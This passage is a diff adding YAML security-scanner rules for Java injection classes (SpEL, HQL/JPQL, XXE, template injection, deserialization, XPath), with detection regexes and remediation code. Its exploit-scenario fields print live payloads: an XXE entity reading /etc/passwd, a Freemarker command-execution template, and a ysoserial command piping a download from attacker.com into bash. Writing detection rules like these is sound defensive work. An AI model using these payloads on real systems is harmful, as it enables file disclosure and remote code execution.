+    attacker_objective: Remote code execution within Spring application context, access to Spring beans, environment variables,
+      file system, and connected databases
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: medium
+  impact: 'SpEL injection allows arbitrary code execution within the Spring application
+
+    context, enabling access to runtime objects, bean manipulation, file system
+
+    access, and remote code execution.
+
+    '
+  remediation: "**Immediate Fix — Use SimpleEvaluationContext:**\n  // UNSAFE: StandardEvaluationContext allows full reflection\n\
+    \  ExpressionParser parser = new SpelExpressionParser();\n  StandardEvaluationContext ctx = new StandardEvaluationContext();\n\
+    \  Object result = parser.parseExpression(userInput).getValue(ctx);\n\n  // SAFE: SimpleEvaluationContext restricts to\
+    \ data binding only\n  ExpressionParser parser = new SpelExpressionParser();\n  SimpleEvaluationContext ctx = SimpleEvaluationContext\n\
+    \      .forReadOnlyDataBinding()\n      .build();\n  Object result = parser.parseExpression(userInput).getValue(ctx);\n\
+    \n**Spring Boot — Avoid dynamic SpEL entirely:**\n  // Instead of evaluating user expressions, use typed DTOs:\n  @PostMapping(\"\
+    /calculate\")\n  public CalculationResult calculate(@Valid @RequestBody CalculationRequest req) {\n      // Use safe arithmetic\
+    \ operations on typed fields\n      return new CalculationResult(req.getOperandA() + req.getOperandB());\n  }\n\n**Jakarta\
+    \ EE — Restrict EL evaluation:**\n  // Never use ELProcessor with untrusted input\n  // If you must evaluate expressions,\
+    \ use allowlisting:\n  private static final Set<String> SAFE_EXPRESSIONS = Set.of(\"sum\", \"avg\", \"count\");\n  public\
+    \ Object safeEval(String exprName, Map<String, Object> data) {\n      if (!SAFE_EXPRESSIONS.contains(exprName)) {\n  \
+    \        throw new SecurityException(\"Expression not allowed\");\n      }\n      // Use predefined expression logic\n\
+    \  }\n\n**Hibernate — SpEL in Spring Data JPA @Query:**\n  // Spring Data JPA @Query SpEL is restricted and generally\
+    \ safe:\n  @Query(\"SELECT u FROM User u WHERE u.tenant = :#{#tenantId}\")\n  List<User> findByTenant(@Param(\"tenantId\"\
+    ) String tenantId);\n  // But never construct @Query strings dynamically from user input\n\n**Thymeleaf (server-side template\
+    \ injection):**\n  // UNSAFE: directly embedding user input in template expressions\n  model.addAttribute(\"greeting\"\
+    , userInput); // if userInput = \"${T(java.lang.Runtime)...}\"\n  // SAFE: always use th:text (auto-escapes) not th:utext\n\
+    \  // <span th:text=\"${greeting}\">Hello</span>\n\n**Additional hardening:**\n  - Audit all uses of ExpressionParser\
+    \ and SpelExpressionParser in the codebase\n  - Use Spring Security's SpEL for authorization only (these are safe by design)\n\
+    \  - Set up WAF rules to detect SpEL payloads (T(java.lang.*), Runtime, ProcessBuilder)\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/917.html
+  - https://docs.spring.io/spring-framework/reference/core/expressions.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Expression_Language_Injection_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: flow-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-002
+    - JAVA-INJ-003
+    - JAVA-SSTI-001
+    - JAVA-DESER-001
+  detection_layer: 1
+- rule_id: JAVA-INJ-005
+  title: HQL/JPQL Injection via String Concatenation
+  description: 'Detects Hibernate HQL or JPA JPQL query construction via string concatenation with user-controlled input.
+    Covers EntityManager.createQuery, Session.createQuery, createNativeQuery, dynamic Criteria API misuse, and Spring Data
+    JPA @Query with SpEL or concatenation-based construction.
+
+    '
+  language: java
+  category: injection
+  severity: High
+  confidence: 0.9
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - hql-injection
+  - jpql-injection
+  - hibernate
+  - jpa
+  - orm-injection
+  patterns:
+  - type: regex
+    pattern: (?:createQuery|createNativeQuery)\s*\(\s*['"](?:SELECT|FROM|UPDATE|DELETE)\b[^'"]*["']\s*\+\s*(?:request|param|input|user)
+    description: createQuery/createNativeQuery with concatenated tainted input
+  - type: regex
+    pattern: (?:entityManager|em|session)\s*\.(?:createQuery|createNativeQuery)\s*\(\s*\w*(?:hql|jpql|query|sql)\s*\+
+    description: EntityManager/Session create query with variable concatenation
+  - type: regex
+    pattern: String\s+\w*(?:hql|jpql|query)\w*\s*=\s*['"](?:SELECT|FROM|UPDATE|DELETE)\b[^'"]*["']\s*\+\s*\w+
+    description: HQL/JPQL string variable built via concatenation
+  - type: regex
+    pattern: \.createQuery\s*\(\s*"FROM\s+\w+\s+WHERE\s+\w+\s*=\s*"\s*\+\s*\w+
+    description: createQuery with FROM-WHERE pattern and concatenation
+  - type: regex
+    pattern: \.createQuery\s*\(\s*['"](?:SELECT|FROM|UPDATE|DELETE)\b[^'"]*["']\s*\+\s*\w+\.get(?:Parameter|Header|Attribute)\s*\(
+    description: createQuery with direct HttpServletRequest getter concatenation
+  - type: regex
+    pattern: (?:session|entityManager|em)\s*\.createSQLQuery\s*\(\s*['"][^'"]*["']\s*\+\s*(?:request|param|input|user)
+    description: Hibernate deprecated createSQLQuery with tainted concatenation
+  - type: regex
+    pattern: StringBuilder\s+\w*(?:hql|jpql|query)\w*\s*=.*\.append\s*\(\s*(?:request|param|input|user|arg)
+    description: StringBuilder-based HQL/JPQL with tainted append
+  - type: regex
+    pattern: String\.format\s*\(\s*['"](?:SELECT|FROM|UPDATE|DELETE)\b[^'"]*%s[^'"]*["']\s*,\s*(?:request|param|input|user)
+    description: String.format used for HQL/JPQL construction with tainted input
+  - type: regex
+    pattern: (?:session|entityManager|em)\s*\.(?:createQuery|createNativeQuery)\s*\(\s*"[^"]*"\s*\+\s*\w+\s*\+\s*"[^"]*"
+    description: Multi-part string concatenation in createQuery
+  - type: regex
+    pattern: \.createStoredProcedureQuery\s*\(\s*(?:request|param|input|user|data)\b
+    description: createStoredProcedureQuery with tainted procedure name
+  - type: regex
+    pattern: Restrictions\.sqlRestriction\s*\(\s*[^)]*\+\s*(?:request|param|input|user)
+    description: Hibernate Restrictions.sqlRestriction with tainted SQL fragment
+  anti_patterns:
+  - setParameter
+  - setString
+  - :param
+  - ?1
+  - CriteriaBuilder
+  - CriteriaQuery
+  - '@Query.*:param'
+  - '@Query.*?1'
+  - '@Query.*?2'
+  - TypedQuery
+  - NamedQuery
+  - '@NamedQuery'
+  - '@NamedNativeQuery'
+  - createNamedQuery
+  - JpaRepository
+  - CrudRepository
+  - JpaSpecificationExecutor
+  - Specification
+  - Predicate
+  - cb.equal
+  - cb.like
+  - cb.and
+  - cb.or
+  - Root.get
+  - QueryDSL
+  - JPAQueryFactory
+  - BooleanExpression
+  - QEntity
+  - mybatis
+  - '#{param}'
+  - SqlSessionFactory
+  - spring.data.jpa
+  - findBy
+  - findAll
+  - repository.save
+  - Pageable
+  - Sort
+  - Example.of
+  - ExampleMatcher
+  context_awareness:
+    surrounding_context_patterns:
+    - import javax.persistence
+    - import jakarta.persistence
+    - import org.hibernate
+    - import org.hibernate.query
+    - import org.hibernate.Session
+    - import javax.persistence.EntityManager
+    - import jakarta.persistence.EntityManager
+    - '@PersistenceContext'
+    - '@Repository'
+    - '@Transactional'
+    - extends JpaRepository
+    - implements CrudRepository
+    taint_source_indicators:
+    - request.getParameter
+    - '@RequestParam'
+    - '@PathVariable'
+    - '@RequestBody'
+    - '@ModelAttribute'
+    - HttpServletRequest
+    - BindingResult
+    - WebRequest
+    - SearchCriteria
+    - FilterDTO
+    - SortField
+    taint_sink_indicators:
+    - EntityManager.createQuery
+    - EntityManager.createNativeQuery
+    - Session.createQuery
+    - Session.createSQLQuery
+    - Session.createNativeQuery
+    - EntityManager.createStoredProcedureQuery
+    - Restrictions.sqlRestriction
+    sanitization_patterns:
+    - setParameter
+    - setString
+    - setInteger
+    - setLong
+    - :paramName
+    - ?1
+    - CriteriaBuilder
+    - CriteriaQuery
+    - Predicate
+    - Specification
+    - InputValidator
+    - Pattern.matches
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1.0 - orm_protection_coverage)
+    exploitability_score: Medium
+  exploit_scenario:
+    attack_example: 'An enterprise HR application has a search endpoint /api/employees?dept= that builds a Hibernate HQL query
+      via concatenation: session.createQuery("FROM Employee e WHERE e.department = ''" + dept + "''"). An attacker submits
+      dept='' OR ''1''=''1 which modifies the HQL query to return all employees. Escalating further, the attacker uses HQL-specific
+      features: dept='' OR 1=1 AND e.salary > 100000 ORDER BY e.ssn ASC -- which exfiltrates salary data and Social Security
+      numbers sorted for convenient harvesting. While HQL is more restrictive than raw SQL, the attacker can still enumerate
+      entity properties and extract sensitive data from any mapped entity attribute.
+
+      '
+    example_payload: ''' OR 1=1 AND e.role = ''ADMIN'' ORDER BY e.email ASC --'
+    attacker_objective: Unauthorized data access via ORM query manipulation, bypassing business logic access controls, extracting
+      sensitive entity attributes
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  impact: 'HQL/JPQL injection can bypass ORM protections when queries are constructed
+
+    via concatenation. While more limited than raw SQL injection, it still
+
+    enables unauthorized data access and manipulation.
+
+    '
+  remediation: "**Immediate Fix — Use named or positional parameters:**\n  // UNSAFE:\n  session.createQuery(\"FROM User WHERE\
+    \ name = '\" + input + \"'\");\n\n  // SAFE — named parameter:\n  Query<User> q = session.createQuery(\"FROM User u WHERE\
+    \ u.name = :name\", User.class);\n  q.setParameter(\"name\", input);\n  List<User> results = q.getResultList();\n\n  //\
+    \ SAFE — positional parameter:\n  TypedQuery<User> q = em.createQuery(\"SELECT u FROM User u WHERE u.name = ?1\", User.class);\n\
+    \  q.setParameter(1, input);\n\n**Spring Boot / Spring Data JPA:**\n  // Use repository method naming convention (safest):\n\
+    \  public interface UserRepository extends JpaRepository<User, Long> {\n      List<User> findByName(String name);\n  \
+    \    List<User> findByDepartmentAndActiveTrue(String department);\n  }\n\n  // Or use @Query with named parameters:\n\
+    \  @Query(\"SELECT u FROM User u WHERE u.name = :name AND u.dept = :dept\")\n  List<User> searchUsers(@Param(\"name\"\
+    ) String name, @Param(\"dept\") String dept);\n\n  // Or use Specifications for dynamic queries:\n  public class UserSpecifications\
+    \ {\n      public static Specification<User> hasName(String name) {\n          return (root, query, cb) -> cb.equal(root.get(\"\
+    name\"), name);\n      }\n  }\n\n**Jakarta EE / JPA Criteria API:**\n  CriteriaBuilder cb = em.getCriteriaBuilder();\n\
+    \  CriteriaQuery<User> cq = cb.createQuery(User.class);\n  Root<User> root = cq.from(User.class);\n  List<Predicate> predicates\
+    \ = new ArrayList<>();\n  if (nameFilter != null) {\n      predicates.add(cb.equal(root.get(\"name\"), nameFilter));\n\
+    \  }\n  cq.where(predicates.toArray(new Predicate[0]));\n  List<User> results = em.createQuery(cq).getResultList();\n\n\
+    **Hibernate — Criteria API (legacy):**\n  Criteria criteria = session.createCriteria(User.class);\n  criteria.add(Restrictions.eq(\"\
+    name\", input));\n  List<User> results = criteria.list();\n  // Note: Hibernate Criteria API is deprecated; prefer JPA\
+    \ CriteriaBuilder\n\n**MyBatis — Use #{} (never ${}):**\n  <!-- SAFE: parameterized binding -->\n  <select id=\"findByName\"\
+    \ resultType=\"User\">\n    SELECT * FROM users WHERE name = #{name}\n  </select>\n\n  <!-- UNSAFE: raw string interpolation\
+    \ -->\n  <select id=\"findByName\" resultType=\"User\">\n    SELECT * FROM users WHERE name = '${name}'\n  </select>\n\
+    \n**QueryDSL (type-safe alternative):**\n  QUser user = QUser.user;\n  List<User> results = queryFactory.selectFrom(user)\n\
+    \      .where(user.name.eq(input))\n      .fetch();\n\n**Additional hardening:**\n  - Enable Hibernate SQL logging in\
+    \ development to review generated queries\n  - Use static analysis tools (SpotBugs, Find Security Bugs) to detect concatenation\
+    \ patterns\n  - Enforce code review policies for any direct createQuery/createNativeQuery usage\n  - Consider using Spring\
+    \ Data Specifications for all dynamic query requirements\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
+  - https://docs.jboss.org/hibernate/orm/current/userguide/html_single/Hibernate_User_Guide.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-001
+    - JAVA-INJ-004
+    - JAVA-AUTH-001
+    - JAVA-MASS-ASSIGN-001
+  detection_layer: 1
+- rule_id: JAVA-INJ-006
+  title: XML External Entity (XXE) Injection
+  description: 'Detects XML parsing with external entity processing enabled via DocumentBuilderFactory, SAXParserFactory,
+    XMLInputFactory, or TransformerFactory without proper feature disabling.
+
+    '
+  language: java
+  category: injection
+  severity: High
+  confidence: 0.92
+  cwe: CWE-611
+  owasp: A05:2021-Security-Misconfiguration
+  tags:
+  - xxe
+  - xml-injection
+  - file-disclosure
+  - ssrf
+  - java
+  detection_layer: 1
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: DocumentBuilderFactory\.newInstance\s*\(\s*\)(?![\s\S]{0,300}(?:setFeature|FEATURE_SECURE_PROCESSING))
+    description: DocumentBuilderFactory without secure features
+  - type: regex
+    pattern: SAXParserFactory\.newInstance\s*\(\s*\)(?![\s\S]{0,300}(?:setFeature|FEATURE_SECURE_PROCESSING))
+    description: SAXParserFactory without secure features
+  - type: regex
+    pattern: XMLInputFactory\.newInstance\s*\(\s*\)(?![\s\S]{0,200}(?:SUPPORT_DTD|IS_SUPPORTING_EXTERNAL_ENTITIES))
+    description: XMLInputFactory without DTD/external entity disabled
+  - type: regex
+    pattern: TransformerFactory\.newInstance\s*\(\s*\)(?![\s\S]{0,200}(?:ACCESS_EXTERNAL|FEATURE_SECURE))
+    description: TransformerFactory without access restrictions
+  - type: regex
+    pattern: new\s+XMLReader\s*\(\s*\)(?![\s\S]{0,200}setFeature)
+    description: XMLReader without feature configuration
+  anti_patterns:
+  - FEATURE_SECURE_PROCESSING
+  - disallow-doctype-decl
+  - external-general-entities.*false
+  - external-parameter-entities.*false
+  - SUPPORT_DTD.*false
+  - IS_SUPPORTING_EXTERNAL_ENTITIES.*false
+  - ACCESS_EXTERNAL_DTD
+  - ACCESS_EXTERNAL_STYLESHEET
+  - setExpandEntityReferences(false)
+  bypass_variants:
+  - description: XXE via XSLT stylesheet
+    pattern: TransformerFactory.*newTemplates\s*\(\s*new\s+StreamSource
+  - description: XXE via XInclude
+    pattern: setXIncludeAware\s*\(\s*true\s*\)
+  evasion_indicators:
+  - Parameter entity injection
+  - XInclude-based XXE
+  - XSLT-based XXE
+  encoding_variants:
+  - type: utf7
+    pattern: \\+ADw-\\+ACE-DOCTYPE
+  - type: utf16
+    pattern: \\xff\\xfe.*DOCTYPE
+  multi_function_chain_patterns:
+  - request.getInputStream() -> DocumentBuilder.parse(inputStream)
+  - request.getReader() -> SAXParser.parse(reader)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: File disclosure and SSRF via external entities
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.getInputStream(), @RequestBody
+    sink: DocumentBuilder.parse(), SAXParser.parse()
+    through: XML parsing with default entity resolution
+  impact: 'XXE enables reading local files, SSRF to internal services, denial of
+
+    service via billion laughs, and port scanning of internal networks.
+
+    '
+  remediation: "Disable external entities in DocumentBuilderFactory:\n  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n\
+    \  dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n  dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\"\
+    , false);\n  dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n  dbf.setXIncludeAware(false);\n\
+    \  dbf.setExpandEntityReferences(false);\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/611.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - import javax.xml.parsers
+    - import org.xml.sax
+    - import javax.xml.stream
+    - import javax.xml.transform
+    taint_source_indicators:
+    - request.getInputStream()
+    - request.getReader()
+    - '@RequestBody'
+    - MultipartFile
+    taint_sink_indicators:
+    - DocumentBuilder.parse(
+    - SAXParser.parse(
+    - XMLStreamReader
+    - Transformer.transform(
+    sanitization_patterns:
+    - FEATURE_SECURE_PROCESSING
+    - disallow-doctype-decl
+    - SUPPORT_DTD.*false
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (1 - feature_hardening)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Spring Boot API accepts XML uploads. The parser uses default DocumentBuilderFactory.
+
+      Attacker sends: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
+
+      '
+    example_payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+    attacker_objective: Read local files, perform SSRF to internal services, cause DoS
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-001
+    - JAVA-INJ-003
+    - JAVA-INJ-009
+- rule_id: JAVA-INJ-007
+  title: Server-Side Template Injection (SSTI)
+  description: 'Detects template rendering with user-controlled template strings in Freemarker, Velocity, Pebble, or Thymeleaf
+    enabling arbitrary code execution.
+
+    '
+  language: java
+  category: injection
+  severity: High
+  confidence: 0.89
+  cwe: CWE-1336
+  owasp: A03:2021-Injection
+  tags:
+  - ssti
+  - template-injection
+  - freemarker
+  - velocity
+  - thymeleaf
+  - rce
+  detection_layer: 2
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: new\s+Template\s*\(\s*[^,]*,\s*new\s+StringReader\s*\(\s*(?:request|param|input|user|data)\b
+    description: Freemarker Template from user-controlled StringReader
+  - type: regex
+    pattern: Velocity(?:Engine)?\.evaluate\s*\([^,]*,\s*[^,]*,\s*[^,]*,\s*new\s+StringReader\s*\(\s*(?:request|param|input|user)\b
+    description: Velocity evaluate with user-controlled template
+  - type: regex
+    pattern: templateEngine\.process\s*\(\s*(?:request|param|input|user|data)\b
+    description: Thymeleaf process with user-controlled template name
+  - type: regex
+    pattern: new\s+PebbleTemplate\s*\([^)]*(?:request|param|input|user)\b
+    description: Pebble template from user input
+  - type: regex
+    pattern: SpringTemplateEngine\s*\(\s*\)[\s\S]{0,200}\.process\s*\(\s*(?:request|param|input|user)\b
+    description: SpringTemplateEngine processing user-controlled template
+  anti_patterns:
+  - templateResolver
+  - ClassLoaderTemplateResolver
+  - FileTemplateLoader
+  - SpringResourceTemplateResolver
+  - TemplateLoader
+  - SandboxExtension
+  - TemplateConfiguration
+  bypass_variants:
+  - description: Freemarker built-in exec
+    pattern: \\$\\{.*\\.exec\\s*\\(
+  - description: Velocity class.forName
+    pattern: '#set.*Class\\.forName'
+  evasion_indicators:
+  - Freemarker ?new() built-in
+  - Velocity ClassTool reflection
+  - Thymeleaf __${expression}__ preprocessor
+  encoding_variants:
+  - type: unicode
+    pattern: \\\\u0024\\\\u007b
+  multi_function_chain_patterns:
+  - request.getParameter('template') -> new Template(name, new StringReader(input))
+  - request.getParameter('view') -> templateEngine.process(view)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: RCE via template engine object traversal
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: '@RequestParam, @RequestBody'
+    sink: Template constructor, Velocity.evaluate()
+    through: User-controlled template string
+  impact: 'SSTI in Java template engines allows arbitrary code execution via
+
+    reflection, class loading, and Runtime.exec() through template expressions.
+
+    '
+  remediation: 'Never render user-controlled strings as templates. Use file-based template
+
+    resolution with ClassLoaderTemplateResolver or FileTemplateLoader. For
+
+    Freemarker, set new_builtin_class_resolver to TemplateClassResolver.SAFER_RESOLVER.
+
+    '
+  references:
+  - https://portswigger.net/research/server-side-template-injection
+  - https://cwe.mitre.org/data/definitions/1336.html
+  context_awareness:
+    surrounding_context_patterns:
+    - import freemarker
+    - import org.apache.velocity
+    - import org.thymeleaf
+    - import io.pebbletemplates
+    taint_source_indicators:
+    - request.getParameter(
+    - '@RequestParam'
+    - '@RequestBody'
+    - '@PathVariable'
+    taint_sink_indicators:
+    - Template(
+    - Velocity.evaluate(
+    - templateEngine.process(
+    - PebbleTemplate(
+    sanitization_patterns:
+    - TemplateClassResolver.SAFER
+    - ClassLoaderTemplateResolver
+    - FileTemplateLoader
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (1 - sandbox_presence)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Freemarker-based CMS renders user templates. Attacker sends:
+
+      <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+      '
+    example_payload: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
+    attacker_objective: Execute arbitrary code via template engine
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-004
+    - JAVA-INJ-002
+    - JAVA-INJ-008
+- rule_id: JAVA-INJ-008
+  title: Unsafe Deserialization via ObjectInputStream
+  description: 'Detects Java deserialization of untrusted data via ObjectInputStream.readObject(), XMLDecoder, or third-party
+    libraries (Kryo, Hessian, XStream) without deserialization filters.
+
+    '
+  language: java
+  category: injection
+  severity: High
+  confidence: 0.95
+  cwe: CWE-502
+  owasp: A08:2021-Software-and-Data-Integrity-Failures
+  tags:
+  - deserialization
+  - rce
+  - objectinputstream
+  - gadget-chain
+  - java
+  detection_layer: 1
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: new\s+ObjectInputStream\s*\(\s*(?:request|param|input|socket|conn|data|body|stream)\b
+    description: ObjectInputStream from user-controlled stream
+  - type: regex
+    pattern: \.readObject\s*\(\s*\)[\s\S]{0,100}(?:request|input|socket|HttpServletRequest)
+    description: readObject near HTTP/socket input context
+  - type: regex
+    pattern: new\s+XMLDecoder\s*\(\s*(?:request|param|input|data|body|stream)\b
+    description: XMLDecoder with user-controlled input
+  - type: regex
+    pattern: xstream\.fromXML\s*\(\s*(?:request|param|input|data|body)\b
+    description: XStream deserialization of user input
+  - type: regex
+    pattern: new\s+(?:Kryo|HessianInput|BurlapInput)\s*\([^)]*(?:request|input|data|stream)\b
+    description: Kryo/Hessian deserialization from user data
+  anti_patterns:
+  - ObjectInputFilter
+  - setObjectInputFilter
+  - serialFilter
+  - ValidatingObjectInputStream
+  - ClassNameValidator
+  - lookAheadObjectInputStream
+  - notsoserial
+  - SerialKiller
+  - XStream.allowTypes
+  - XStream.addPermission
+  bypass_variants:
+  - description: Gadget chain via commons-collections
+    pattern: InvokerTransformer|ChainedTransformer|ConstantTransformer
+  - description: Gadget chain via Spring
+    pattern: MethodInvokeTypeProvider|SpringAbstractBeanFactory
+  evasion_indicators:
+  - Base64-encoded serialized objects
+  - Gadget chains via commons-collections, Spring, Hibernate
+  - Magic bytes AC ED 00 05
+  encoding_variants:
+  - type: base64
+    pattern: base64.*ObjectInputStream|ObjectInputStream.*base64
+  - type: gzip
+    pattern: GZIPInputStream.*ObjectInputStream
+  multi_function_chain_patterns:
+  - request.getInputStream() -> new ObjectInputStream(is) -> readObject()
+  - Base64.decode(request.getParameter()) -> new ObjectInputStream() -> readObject()
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: RCE via deserialization gadget chains
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.getInputStream(), socket.getInputStream()
+    sink: ObjectInputStream.readObject()
+    through: Direct deserialization of untrusted bytes
+  impact: 'Java deserialization leads to RCE via gadget chains (commons-collections,
+
+    Spring, Hibernate). Full server compromise is achievable.
+
+    '
+  remediation: 'Use ObjectInputFilter (Java 9+) to restrict deserializable classes.
+
+    Use ValidatingObjectInputStream from Apache Commons IO. Prefer JSON
+
+    serialization (Jackson, Gson) over Java serialization. Remove unused
+
+    gadget chain libraries from classpath.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/502.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - import java.io.ObjectInputStream
+    - import java.beans.XMLDecoder
+    - import com.thoughtworks.xstream
+    taint_source_indicators:
+    - request.getInputStream()
+    - socket.getInputStream()
+    - '@RequestBody'
+    - Base64.decode(
+    taint_sink_indicators:
+    - readObject()
+    - XMLDecoder.readObject()
+    - xstream.fromXML(
+    - Kryo.readObject(
+    sanitization_patterns:
+    - ObjectInputFilter
+    - ValidatingObjectInputStream
+    - SerialKiller
+    - XStream.allowTypes
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - filter_presence)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Java RMI service deserializes client objects. Attacker sends a crafted
+
+      payload using ysoserial CommonsCollections gadget chain to execute commands.
+
+      '
+    example_payload: java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/shell.sh|bash'
+    attacker_objective: Remote code execution via deserialization gadget chains
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-003
+    - JAVA-INJ-002
+    - JAVA-INJ-004
+- rule_id: JAVA-INJ-009
+  title: XPath Injection via String Concatenation
+  description: 'Detects XPath query construction with user-controlled input via string concatenation in javax.xml.xpath.XPath
+    evaluate/compile calls.
+
+    '
+  language: java
+  category: injection
+  severity: High
+  confidence: 0.88
+  cwe: CWE-643
+  owasp: A03:2021-Injection
+  tags:
+  - xpath-injection
+  - xml
+  - authentication-bypass
+  - java
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: \.(?:evaluate|compile)\s*\(\s*"[^"]*"\s*\+\s*(?:request|param|input|user|data)\b
+    description: XPath evaluate/compile with concatenated user input
+  - type: regex
+    pattern: (?:xpath|xp|xPath)\s*\.(?:evaluate|compile)\s*\(\s*"[^"]*"\s*\+\s*\w+\.get(?:Parameter|Header)\s*\(
+    description: XPath with direct request getter concatenation
+  - type: regex
+    pattern: String\.format\s*\(\s*"[^"]*(?://|/\w+\[)[^"]*%s[^"]*"\s*,\s*(?:request|param|input|user)\b
+    description: XPath built via String.format with user input
+  - type: regex
+    pattern: (?:xpath|xPath)Expression\s*=\s*"[^"]*"\s*\+\s*(?:request|param|input|user)\b
+    description: XPath expression variable with concatenated input
+  anti_patterns:
+  - XPathVariableResolver
+  - setXPathVariableResolver
+  - XPathExpression
+  - sanitize
+  - escape
+  - Pattern.matches
+  bypass_variants:
+  - description: Boolean blind XPath injection
+    pattern: or\s+1\s*=\s*1
+  - description: XPath union operator
+    pattern: \\|\\s*//\\w+
+  evasion_indicators:
+  - Boolean-based blind XPath injection
+  - XPath union operator injection
+  encoding_variants:
+  - type: unicode
+    pattern: \\u0027.*or
+  multi_function_chain_patterns:
+  - request.getParameter('user') -> "//user[@name='" + user + "']" -> xpath.evaluate()
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Data extraction and authentication bypass via XPath
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.getParameter(), @RequestParam
+    sink: XPath.evaluate(), XPath.compile()
+    through: String concatenation
+  impact: 'XPath injection enables extraction of arbitrary XML data and
+
+    authentication bypass in XML-based data stores.
+
+    '
+  remediation: "Use XPathVariableResolver for parameterized queries:\n  xpath.setXPathVariableResolver(v -> {\n    if (\"\
+    username\".equals(v.getLocalPart())) return sanitizedInput;\n    return null;\n  });\n  xpath.evaluate(\"//user[@name=$username]\"\
+    , doc, XPathConstants.NODESET);\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/643.html
+  - https://owasp.org/www-community/attacks/XPATH_Injection
+  context_awareness:
+    surrounding_context_patterns:
+    - import javax.xml.xpath
+    - XPathFactory
+    - XPath
+    taint_source_indicators:
+    - request.getParameter(
+    - '@RequestParam'
+    - '@PathVariable'
+    taint_sink_indicators:
+    - xpath.evaluate(
+    - xpath.compile(
+    - XPath.evaluate(
+    sanitization_patterns:
+    - XPathVariableResolver
+    - sanitize
+    - Pattern.matches
+  severity_scoring:
+    severity_weight: 7
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'Auth system uses xpath.evaluate("//user[@name=''" + username + "'']", doc).
+
